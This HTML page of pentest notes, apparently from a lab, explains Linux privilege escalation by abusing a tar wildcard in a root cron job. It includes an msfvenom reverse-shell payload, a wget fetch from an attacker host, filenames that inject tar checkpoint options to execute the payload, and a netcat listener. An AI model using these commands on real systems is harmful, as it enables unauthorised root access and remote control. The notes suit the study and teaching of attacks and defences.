<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Wildcards</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Wildcards</h1><br/>• When a wildcard character (*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard.<br />• This process replaces the wildcard with a space-separated list of the file and directory names in the current directory.<br />    <span style="color:#a5452a;">examples:</span><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">echo</span> *</pre></div><br />    <a href=""><img src="images/1304-1.png" alt="images/1304-1.png" /></a><br />• filename expansion happens before the command is executed, it is possible to pass command line options (e.g. -h, --help) to commands by creating files with these names.<br />    Filenames are not simply restricted to simple options like -h or --help.<br />   ◇ <strong>GTFOBins</strong> ( <a href="https://gtfobins.github.io">https://gtfobins.github.io</a>) can help determine whether a command has command line options which will be useful for our purposes.<br /><br />1. View the <span style="color:#1e90ff;">cronJobs</span> of the system-wide crontab:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>crontab</pre></div><br />    <a href=""><img src="images/1304-2.png" alt="images/1304-2.png" /></a><br />2. View the contents of the /usr/local/bin/compress.sh file:<br />    <a href=""><img src="images/1304-3.png" alt="images/1304-3.png" /></a><br />    Note that the tar command is run with a <span style="color:#00ff00;">wildcard</span> in the <strong><span style="color:#9141ac;">/home/user directory</span></strong>.<br />    In tar, there are “checkpoint” flags, which allow you to execute actions (i.e., run an arbitrary operating system command once the tar command executes.) after a specified number of files have been archived.<br />    The <span style="color:#00ff00;">wildcard</span> for tar will call these checkpoints.<br />5. <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins</a> shows that tar has command line options which can be used to run other commands as part of a checkpoint feature.<br />    <a href=""><img src="images/1304-4.png" alt="images/1304-4.png" /></a><br />	<br />7. Use msfvenom(attacker machine) to create a reverse shell ELF payload:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p linux<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp LHOST=&lt;IPattacker&gt; LPORT=53 -f elf -o shell.elf<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># python -m SimpleHTTPServer</pre></div><br />8. Create checkpoint files in the <strong><span style="color:#9141ac;">/home/user directory</span></strong> and make shell.elf executable:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">wget</span> http<span style="color:#ff9d00;font-weight:700">://</span>[attackerIp]<span style="color:#ff9d00;font-weight:700">/</span>shell.elf<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">chmod</span> +x <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>shell.elf<br /><span style="color:#0088ff;font-weight:400">#create a checkpoint for every file that is processed</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">touch</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>--checkpoint=1<br /><span style="color:#0088ff;font-weight:400">#action to run for every checkpoint</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">touch</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>--checkpoint-action=exec=shell.elf</pre></div><br />    First we will specify that for every file that has been archived, there is a checkpoint. Then we give an action to that checkpoint.<br />    When the <span style="color:#00ff00;">wildcard</span> will be read, it will read the checkpoint<br />9. Run a netcat listener on the attacker machine and wait for the <span style="color:#1e90ff;">cron job</span> to run.<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ nc -nvlp 53</pre></div><br />    Because it is a <span style="color:#1e90ff;">cronjob</span> we have to wait some time before we receive a connection <br />    <a href=""><img src="images/1304-5.png" alt="images/1304-5.png" /></a><br /></div>
</body>
</html>
